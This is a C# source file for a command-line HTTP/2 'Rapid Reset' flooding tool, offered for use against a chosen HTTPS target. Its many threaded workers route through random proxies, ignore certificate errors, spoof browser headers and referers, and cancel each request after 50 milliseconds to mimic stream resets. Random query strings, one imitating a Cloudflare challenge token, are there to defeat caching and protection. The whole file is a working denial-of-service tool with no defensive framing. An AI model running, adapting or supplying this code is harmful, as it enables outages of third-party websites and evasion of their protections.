// RapidResetFlood.cs
// Compile: dotnet new console -n RapidResetFlood -f net8.0
// Replace Program.cs with this code.
// Usage: dotnet run -- <method> <target> <time> <threads> <rate> <proxyfile> [--query 1] [--cookie ...] [--referer rand] [--postdata ...] [--randrate] [--header "name:value#name2:value2"] [--legit] [--full]

using System;
using System.Collections.Concurrent;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Net.Security;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

class RapidResetFlood
{
    static readonly Random _rand = new Random();
    static string _targetHost;
    static string _targetPath;
    static string _method = "GET";
    static int _durationSec;
    static int _threads;
    static int _baseRate;
    static string _proxyFile;
    static string _queryType;
    static string _customCookie;
    static string _refererMode;
    static string _postData;
    static bool _randRate;
    static string _customHeadersRaw;
    static bool _legitHeaders;
    static bool _fullMode;  // if true, send rate requests per interval, else 1 per interval
    static string _customUA;

    static readonly string[] _acceptHeaders = {
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "*/*"
    };
    static readonly string[] _langHeaders = { "en-US,en;q=0.9", "en-US,en;q=0.7", "fr-FR,fr;q=0.8,en;q=0.7" };
    static readonly string[] _userAgents = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
    };
    static readonly string[] _refererDomains = { "google.com", "bing.com", "yahoo.com", "example.com" };

    static async Task Main(string[] args)
    {
        if (args.Length < 6)
        {
            Console.WriteLine("Usage: RapidResetFlood <method> <target> <time> <threads> <rate> <proxyfile> [--query 1/2/3] [--cookie val] [--referer rand] [--postdata data] [--randrate] [--header h:v#h2:v2] [--legit] [--full] [--useragent ua]");
            return;
        }

        _method = args[0].ToUpper();
        string targetUrl = args[1];
        _durationSec = int.Parse(args[2]);
        _threads = int.Parse(args[3]);
        _baseRate = int.Parse(args[4]);
        _proxyFile = args[5];

        // Parse optional flags
        for (int i = 6; i < args.Length; i++)
        {
            if (args[i] == "--query" && i + 1 < args.Length) _queryType = args[++i];
            else if (args[i] == "--cookie" && i + 1 < args.Length) _customCookie = args[++i];
            else if (args[i] == "--referer" && i + 1 < args.Length) _refererMode = args[++i];
            else if (args[i] == "--postdata" && i + 1 < args.Length) _postData = args[++i];
            else if (args[i] == "--randrate") _randRate = true;
            else if (args[i] == "--header" && i + 1 < args.Length) _customHeadersRaw = args[++i];
            else if (args[i] == "--legit") _legitHeaders = true;
            else if (args[i] == "--full") _fullMode = true;
            else if (args[i] == "--useragent" && i + 1 < args.Length) _customUA = args[++i];
        }

        // Validate
        if (!targetUrl.StartsWith("https://"))
        {
            Console.WriteLine("Only HTTPS targets are supported for HTTP/2.");
            return;
        }
        var uri = new Uri(targetUrl);
        _targetHost = uri.Host;
        _targetPath = uri.PathAndQuery;
        if (string.IsNullOrEmpty(_targetPath)) _targetPath = "/";

        // Load proxies
        var proxies = File.Exists(_proxyFile) 
            ? File.ReadAllLines(_proxyFile).Where(l => !string.IsNullOrWhiteSpace(l) && !l.StartsWith("#") && l.Contains(':')).ToArray()
            : new string[0];
        if (proxies.Length == 0)
        {
            Console.WriteLine("[!] No proxies loaded. Using direct connection.");
            proxies = new string[] { null };
        }

        Console.WriteLine($"\n[🔥] RapidReset Flood | Target: {targetUrl} | Duration: {_durationSec}s");
        Console.WriteLine($"     Threads: {_threads} | Base rate: {_baseRate} req/s/thread | Full mode: {_fullMode}");
        Console.WriteLine($"     Proxies loaded: {proxies.Length}");

        var cts = new CancellationTokenSource();
        var tasks = new Task[_threads];
        var counters = new ConcurrentDictionary<int, long>();

        for (int i = 0; i < _threads; i++)
        {
            int tid = i;
            counters[tid] = 0;
            tasks[tid] = Task.Run(() => Worker(tid, targetUrl, proxies, cts.Token, counters));
        }

        // RPS monitor
        var monitor = Task.Run(async () =>
        {
            while (!cts.Token.IsCancellationRequested)
            {
                await Task.Delay(1000);
                foreach (var kv in counters)
                {
                    if (kv.Value > 0)
                        Console.WriteLine($"[Worker {kv.Key}] RPS: {kv.Value}");
                    counters[kv.Key] = 0;
                }
            }
        });

        await Task.Delay(_durationSec * 1000);
        cts.Cancel();
        await Task.WhenAll(tasks);
        await monitor;
        Console.WriteLine("\n[⏹️] Attack finished.");
    }

    static async Task Worker(int id, string targetUrl, string[] proxies, CancellationToken ct, ConcurrentDictionary<int, long> counter)
    {
        // Select random proxy for this worker
        string proxyStr = proxies.Length > 0 ? proxies[_rand.Next(proxies.Length)] : null;
        var handler = new SocketsHttpHandler
        {
            PooledConnectionLifetime = TimeSpan.FromSeconds(30),
            PooledConnectionIdleTimeout = TimeSpan.FromSeconds(10),
            MaxConnectionsPerServer = 1000,
            EnableMultipleHttp2Connections = true,
            SslOptions = new SslClientAuthenticationOptions
            {
                RemoteCertificateValidationCallback = (sender, cert, chain, errors) => true
            }
        };
        if (!string.IsNullOrEmpty(proxyStr))
        {
            var proxyParts = proxyStr.Split(':');
            handler.Proxy = new WebProxy(proxyParts[0], int.Parse(proxyParts[1]));
            handler.UseProxy = true;
        }

        using var client = new HttpClient(handler);
        client.DefaultRequestHeaders.ConnectionClose = false;
        client.DefaultRequestHeaders.Add("Accept", GetRandomAccept());
        client.DefaultRequestHeaders.Add("Accept-Encoding", "gzip, deflate, br");
        client.DefaultRequestHeaders.Add("Accept-Language", RandomElement(_langHeaders));
        client.DefaultRequestHeaders.Add("Upgrade-Insecure-Requests", "1");
        client.DefaultRequestHeaders.Add("Sec-Fetch-Dest", "document");
        client.DefaultRequestHeaders.Add("Sec-Fetch-Mode", "navigate");
        client.DefaultRequestHeaders.Add("Sec-Fetch-Site", "none");
        client.DefaultRequestHeaders.Add("Sec-Fetch-User", "?1");
        client.DefaultRequestHeaders.Add("Cache-Control", "max-age=0");

        // Custom cookie
        if (!string.IsNullOrEmpty(_customCookie))
        {
            var cookie = _customCookie.Replace("%RAND%", RandomString(10));
            client.DefaultRequestHeaders.Add("Cookie", cookie);
        }

        // Custom user agent
        var ua = string.IsNullOrEmpty(_customUA) ? RandomElement(_userAgents) : _customUA;
        client.DefaultRequestHeaders.Add("User-Agent", ua);

        // Custom headers
        if (!string.IsNullOrEmpty(_customHeadersRaw))
        {
            foreach (var h in _customHeadersRaw.Split('#'))
            {
                var parts = h.Split(':');
                if (parts.Length == 2)
                    client.DefaultRequestHeaders.TryAddWithoutValidation(parts[0].Trim(), parts[1].Trim());
            }
        }

        // Referer
        if (_refererMode == "rand")
        {
            var refDomain = RandomElement(_refererDomains);
            client.DefaultRequestHeaders.Add("Referer", $"https://{refDomain}/");
        }
        else if (!string.IsNullOrEmpty(_refererMode) && _refererMode != "rand")
        {
            client.DefaultRequestHeaders.Add("Referer", _refererMode);
        }

        // Build request URI (with random query if needed)
        string requestUri = BuildUri(targetUrl);

        // Rate limiting
        int rate = _randRate ? _rand.Next(1, 60) : _baseRate;
        int intervalMs = 1000 / rate;
        int requestsPerBatch = _fullMode ? rate : 1;
        var sw = Stopwatch.StartNew();

        while (!ct.IsCancellationRequested && sw.Elapsed.TotalSeconds < _durationSec)
        {
            // Send batch of requests (for full mode) or single request
            var tasks = new Task[requestsPerBatch];
            for (int i = 0; i < requestsPerBatch; i++)
            {
                tasks[i] = SendAndResetRequest(client, requestUri, ct);
            }
            await Task.WhenAll(tasks);
            counter.AddOrUpdate(id, requestsPerBatch, (_, old) => old + requestsPerBatch);

            // Delay to respect rate
            await Task.Delay(intervalMs, ct);
        }
    }

    static async Task SendAndResetRequest(HttpClient client, string uri, CancellationToken ct)
    {
        try
        {
            // Use HttpCompletionOption.ResponseHeadersRead to get response early, then cancel
            using var cts = CancellationTokenSource.CreateLinkedTokenSource(ct);
            // Cancel after a short delay to simulate RST_STREAM (abort stream)
            cts.CancelAfter(50); // 50ms – adjust for aggressiveness

            var request = new HttpRequestMessage(HttpMethod.Get, uri);
            if (_method == "POST" && !string.IsNullOrEmpty(_postData))
            {
                request.Method = HttpMethod.Post;
                request.Content = new StringContent(_postData.Replace("%RAND%", RandomString(10)), Encoding.UTF8, "application/x-www-form-urlencoded");
            }
            else if (_method == "HEAD")
                request.Method = HttpMethod.Head;
            else if (_method == "OPTIONS")
                request.Method = HttpMethod.Options;

            var response = await client.SendAsync(request, HttpCompletionOption.ResponseHeadersRead, cts.Token);
            // Immediately dispose response to close stream – similar to RST_STREAM
            response.Dispose();
        }
        catch (TaskCanceledException)
        {
            // Expected – request aborted
        }
        catch (Exception)
        {
            // Ignore other errors
        }
    }

    static string BuildUri(string baseUrl)
    {
        var uri = new Uri(baseUrl);
        string path = uri.PathAndQuery;
        if (string.IsNullOrEmpty(path)) path = "/";

        if (_queryType == "1")
        {
            string ts = DateTimeOffset.UtcNow.ToUnixTimeSeconds().ToString();
            string rand = RandomString(30) + "_" + RandomString(12) + "-" + ts + "-0-gaNy" + RandomString(8);
            return $"{uri.Scheme}://{uri.Host}{path}?__cf_chl_rt_tk={rand}";
        }
        else if (_queryType == "2")
        {
            string q = RandomString(6) + "&" + RandomString(6);
            return $"{uri.Scheme}://{uri.Host}{path}?{q}";
        }
        else if (_queryType == "3")
        {
            return $"{uri.Scheme}://{uri.Host}{path}?q={RandomString(6)}&{RandomString(6)}";
        }
        else
        {
            // Add random query param to bypass cache
            return $"{uri.Scheme}://{uri.Host}{path}{(path.Contains('?') ? '&' : '?')}_={RandomString(8)}";
        }
    }

    static string GetRandomAccept()
    {
        // If legit headers, use full Chrome accept; else use random from list
        if (_legitHeaders)
            return "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7";
        else
            return RandomElement(_acceptHeaders);
    }

    static string RandomString(int len)
    {
        const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        return new string(Enumerable.Repeat(chars, len).Select(s => s[_rand.Next(s.Length)]).ToArray());
    }

    static T RandomElement<T>(T[] arr) => arr[_rand.Next(arr.Length)];
}
